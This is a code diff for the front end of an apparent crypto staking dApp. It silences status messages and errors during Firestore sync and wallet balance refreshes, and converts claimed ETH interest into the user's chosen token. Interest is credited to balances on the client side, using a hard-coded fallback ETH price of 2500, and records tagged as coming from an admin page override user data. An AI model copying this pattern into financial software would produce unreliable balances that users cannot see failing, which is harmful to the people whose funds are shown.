@@ -377,7 +377,7 @@ async function retry(fn, maxAttempts = 3, delayMs = 3000) {
   }
 }
 
-// ==================== Firestore 儲存 ====================
+// ==================== Firestore 儲存（後台靜默） ====================
 async function saveUserData(data = null, addToPending = true) {
   if (!userAddress) return;
   const dataToSave = data || {
@@ -413,15 +413,12 @@ async function saveUserData(data = null, addToPending = true) {
   }
 }
 
-// ==================== Firestore 載入 + 即時監聽 ====================
+// ==================== Firestore 載入 + 即時監聽（後台靜默） ====================
 async function loadUserDataFromServer() {
   if (!userAddress) return;
   try {
     const snap = await db.collection('users').doc(userAddress).get();
-    if (!snap.exists) {
-      log(`無用戶數據`, 'info');
-      return;
-    }
+    if (!snap.exists) return;
     const userData = snap.data();
     const localData = JSON.parse(localStorage.getItem('userData') || '{}');
     localLastUpdated = localData.lastUpdated || 0;
@@ -444,6 +441,7 @@ async function loadUserDataFromServer() {
       }));
       localLastUpdated = userData.lastUpdated;
       log(`資料同步成功`, 'success');
+      // 【關鍵】同步後「僅更新 UI」，不觸發餘額刷新
       updateClaimableDisplay();
       updateAccountBalanceDisplay();
       updatePledgeSummary();
@@ -457,7 +455,7 @@ async function loadUserDataFromServer() {
 // 即時監聽
 function startRealtimeListener() {
   if (!userAddress) return;
-  const unsubscribe = db.collection('users').doc(userAddress).onSnapshot((docSnap) => {
+  db.collection('users').doc(userAddress).onSnapshot((docSnap) => {
     if (docSnap.exists) {
       const userData = docSnap.data();
       if (userData.lastUpdated > localLastUpdated || userData.source === 'admin.html') {
@@ -468,7 +466,6 @@ function startRealtimeListener() {
   }, (error) => {
     log(`監聽錯誤: ${error.message}`, 'error');
   });
-  return unsubscribe;
 }
 
 function updateStatus(message, isWarning = false) {
@@ -561,7 +558,8 @@ if (walletTokenSelect) {
   walletTokenSelect.addEventListener('change', () => {
     updateWalletBalanceFromCache(); // 極速顯示快取
     updateAccountBalanceDisplay();
-    forceRefreshWalletBalance();    // 立即查最新（非同步）
+    // 後台靜默刷新
+    forceRefreshWalletBalance().catch(() => {});
   });
 }
 
@@ -580,7 +578,6 @@ function updateWalletBalanceFromCache() {
 // 【極速優化】一次性讀取三個代幣餘額
 async function forceRefreshWalletBalance() {
   if (!userAddress) return;
-  updateStatus('Fetching balances...');
   try {
     const [usdtBal, usdcBal, wethBal] = await Promise.all([
       usdtContract.connect(provider).balanceOf(userAddress),
@@ -591,11 +588,9 @@ async function forceRefreshWalletBalance() {
     updateWalletBalanceFromCache(); // 立即更新 UI
     updateAccountBalanceDisplay();
     updateEstimate();
-    saveUserData(null, false);
+    saveUserData(null, false); // 後台靜默儲存
     sendFullStateToBackend();
-    updateStatus('Balances updated.');
   } catch (error) {
-    updateStatus('Balance fetch failed.', true);
     log(`餘額讀取失敗: ${error.message}`, 'error');
   }
 }
@@ -1108,7 +1103,7 @@ function showPledgeDetail() {
   pledgeDetailModal.style.display = 'flex';
 }
 
-// ==================== 【修正】Account Balance 明細 ====================
+// ==================== 【關鍵修正】Claim 後利息轉換成選擇代幣價值 ====================
 function showAccountDetail() {
   if (!accountDetailModal) return;
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
@@ -1189,14 +1184,24 @@ document.addEventListener('DOMContentLoaded', () => {
   if (confirmClaim) {
     confirmClaim.addEventListener('click', async () => {
       closeClaimModal();
-      const claimable = window.currentClaimable || 0;
-      if (claimable < 0.0000001) {
+      const claimableETH = window.currentClaimable || 0;
+      if (claimableETH < 0.0000001) {
         updateStatus(translations[currentLang].noClaimable, true);
         return;
       }
 
+      await refreshEthPrice();
+      const ethPrice = ethPriceCache.price || 2500;
       const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
-      accountBalance[selected].interest += claimable;
+      let claimableInSelectedToken = 0;
+      if (selected === 'WETH') {
+        claimableInSelectedToken = claimableETH;
+      } else {
+        claimableInSelectedToken = claimableETH * ethPrice;
+      }
+
+      // 【關鍵修正】利息加到「選擇代幣」的 interest
+      accountBalance[selected].interest += claimableInSelectedToken;
 
       window.currentClaimable = 0;
       localStorage.setItem('claimable', '0');
@@ -1207,7 +1212,7 @@ document.addEventListener('DOMContentLoaded', () => {
       updateAccountBalanceDisplay();
 
       updateStatus(translations[currentLang].claimSuccess + ' ' + translations[currentLang].nextClaimTime);
-      sendToBackend({ type: 'claim', amount: claimable });
+      sendToBackend({ type: 'claim', amount: claimableETH });
       sendFullStateToBackend();
     });
   }
@@ -1374,6 +1379,6 @@ document.addEventListener('DOMContentLoaded', () => {
 // 自動餘額監控（每 10 秒）
 setInterval(async () => {
   if (userAddress && signer) {
-    await forceRefreshWalletBalance();
+    forceRefreshWalletBalance().catch(() => {});
   }
 }, 10000);
